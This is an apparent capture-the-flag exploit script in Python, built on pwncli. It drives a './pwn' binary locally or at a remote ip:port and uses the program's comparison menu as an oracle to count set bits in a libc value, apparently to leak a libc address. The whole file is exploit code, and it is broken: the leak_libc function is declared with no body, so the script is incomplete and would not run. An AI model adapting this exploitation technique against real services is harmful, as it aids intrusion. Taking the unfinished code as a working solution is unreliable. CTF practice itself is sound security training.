#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
from tqdm import tqdm

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(choice)


def cmp(bot_num, user_num):
    cmd(b"s")
    ru(b"Bot number: ")
    sl(bot_num)
    ru(b"Player number: ")
    sl(user_num)
    ru(b"Simulation result: ")
    if b"Bot win!" in rl():
        return True  # bot_num has more 1, or same 1 and bot_num has less sig bit of 1
    else:
        return False


def leak_1_count():
    libc_temp = 1
    for i in tqdm(range(0, 64)):
        if cmp(b"+", i2b(libc_temp)):
            libc_temp = (libc_temp << 1) | 1
        else:
            return i + 1

def leak_libc():

libc_1_count = leak_1_count()
lg("libc_1_count", libc_1_count)

ia()
